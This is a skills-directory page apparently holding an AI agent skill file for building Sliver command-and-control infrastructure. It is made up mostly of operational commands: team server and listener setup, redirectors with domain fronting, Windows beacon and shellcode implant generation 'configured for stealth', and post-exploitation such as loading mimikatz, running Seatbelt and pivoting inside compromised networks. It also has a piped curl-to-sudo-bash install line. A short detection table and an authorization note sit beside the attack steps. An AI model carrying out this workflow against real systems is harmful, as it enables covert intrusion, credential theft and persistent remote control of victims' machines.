---
rating: ⭐⭐⭐
title: building-c2-infrastructure-with-sliver-framework
url: https://skills.sh/mukul975/anthropic-cybersecurity-skills/building-c2-infrastructure-with-sliver-framework
---

# building-c2-infrastructure-with-sliver-framework

skills/mukul975/anthropic-cybersecurity-skills/building-c2-infrastructure-with-sliver-framework
building-c2-infrastructure-with-sliver-framework
Installation
$ npx skills add https://github.com/mukul975/anthropic-cybersecurity-skills --skill building-c2-infrastructure-with-sliver-framework
SKILL.md
Building C2 Infrastructure with Sliver Framework
Overview

Sliver is an open-source, cross-platform adversary emulation framework developed by BishopFox, written in Go. It provides red teams with implant generation, multi-protocol C2 channels (mTLS, HTTP/S, DNS, WireGuard), multi-operator support, and extensive post-exploitation capabilities. Sliver supports beacon (asynchronous) and session (interactive) modes, making it suitable for both long-haul operations and interactive exploitation. A properly architected Sliver infrastructure uses redirectors, domain fronting, and HTTPS certificates to maintain operational resilience and avoid detection.

When to Use
When deploying or configuring building c2 infrastructure with sliver framework capabilities in your environment
When establishing security controls aligned to compliance requirements
When building or improving security architecture for this domain
When conducting security assessments that require this implementation
Prerequisites
Familiarity with red teaming concepts and tools
Access to a test or lab environment for safe execution
Python 3.8+ with required dependencies installed
Appropriate authorization for any testing activities
Objectives
Deploy a Sliver team server on hardened cloud infrastructure
Configure HTTPS, mTLS, DNS, and WireGuard listeners
Generate implants (beacons and sessions) for target platforms
Set up NGINX or Apache redirectors between implants and the team server
Implement Cloudflare or CDN-based domain fronting for traffic obfuscation
Configure multi-operator access with certificate-based authentication
Establish operational security controls for C2 communications
MITRE ATT&CK Mapping
T1071.001 - Application Layer Protocol: Web Protocols
T1071.004 - Application Layer Protocol: DNS
T1573.002 - Encrypted Channel: Asymmetric Cryptography
T1090.002 - Proxy: External Proxy (Redirectors)
T1105 - Ingress Tool Transfer
T1132.001 - Data Encoding: Standard Encoding
T1572 - Protocol Tunneling
Workflow
Phase 1: Team Server Deployment
Provision a VPS (e.g., DigitalOcean, Linode, AWS EC2) for the team server
Harden the OS: disable SSH password auth, configure UFW/iptables, install fail2ban
Install Sliver using the official install script:
curl https://sliver.sh/install | sudo bash

Start the Sliver server daemon:
systemctl start sliver
# Or run interactively
sliver-server

Generate operator configuration files for team members:
new-operator --name operator1 --lhost <team-server-ip>

Phase 2: Listener Configuration
Configure an HTTPS listener with a legitimate SSL certificate:
https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --cert /path/to/cert.pem --key /path/to/key.pem

Configure a DNS listener for fallback C2:
dns --domains c2dns.example.com --lport 53

Configure mTLS listener for high-security sessions:
mtls --lhost 0.0.0.0 --lport 8888

Configure WireGuard listener for tunneled access:
wg --lport 51820

Phase 3: Redirector Setup
Deploy a separate VPS as a redirector (positioned between targets and team server)
Install and configure NGINX as a reverse proxy:
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;

    location / {
        proxy_pass https://<team-server-ip>:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

Configure iptables rules on the team server to only accept connections from the redirector:
iptables -A INPUT -p tcp --dport 443 -s <redirector-ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP

Optionally set up Cloudflare as a CDN layer in front of the redirector for domain fronting
Phase 4: Implant Generation
Generate an HTTPS beacon implant:
generate beacon --http https://c2.example.com --os windows --arch amd64 --format exe --name payload

Generate a DNS beacon for restricted networks:
generate beacon --dns c2dns.example.com --os windows --arch amd64

Generate a shellcode payload for injection:
generate --http https://c2.example.com --os windows --arch amd64 --format shellcode

Configure beacon jitter and callback intervals:
generate beacon --http https://c2.example.com --seconds 60 --jitter 30

Phase 5: Post-Exploitation Operations
Interact with active beacons/sessions:
beacons        # List active beacons
use <beacon-id> # Interact with a beacon

Execute post-exploitation modules:
ps              # Process listing
netstat         # Network connections
execute-assembly /path/to/Seatbelt.exe -group=all  # Run .NET assemblies
sideload /path/to/mimikatz.dll  # Load DLLs

Set up pivots for internal network access:
pivots tcp --bind 0.0.0.0:9898  # Create pivot listener on compromised host

Use BOF (Beacon Object Files) for in-memory execution:
armory install sa-ldapsearch  # Install from armory
sa-ldapsearch -- "(objectClass=user)"  # Execute BOF

Tools and Resources
Tool	Purpose	Platform
Sliver Server	C2 team server and implant management	Linux/macOS/Windows
Sliver Client	Operator console for team members	Cross-platform
NGINX	Redirector and reverse proxy	Linux
Certbot	Let's Encrypt SSL certificate generation	Linux
Cloudflare	CDN and domain fronting	Cloud
Armory	Sliver extension/BOF package manager	Built-in
Detection Signatures
Indicator	Detection Method
Default Sliver HTTP headers	Network traffic analysis for unusual User-Agent strings
mTLS on non-standard ports	Firewall logs for outbound connections to unusual ports
DNS TXT record queries with high entropy	DNS log analysis for encoded C2 traffic
WireGuard UDP traffic on port 51820	Network flow analysis for WireGuard handshake patterns
Sliver implant file hashes	EDR/AV signature matching against known Sliver samples
Validation Criteria
 Team server deployed and hardened with firewall rules
 HTTPS listener configured with valid SSL certificate
 DNS listener configured as fallback C2 channel
 At least one redirector deployed between targets and team server
 Multi-operator access configured with unique certificates
 Implants generated for target operating systems
 Beacon callback intervals and jitter configured for stealth
 Post-exploitation modules tested (process listing, .NET assembly execution)
 Pivot functionality validated for internal network access
 All C2 traffic encrypted and passing through redirectors
Weekly Installs
26
Repository
mukul975/anthro…y-skills
GitHub Stars
5.9K
First Seen
Mar 16, 2026
Security Audits
Gen Agent Trust HubPass
SocketFail
SnykFail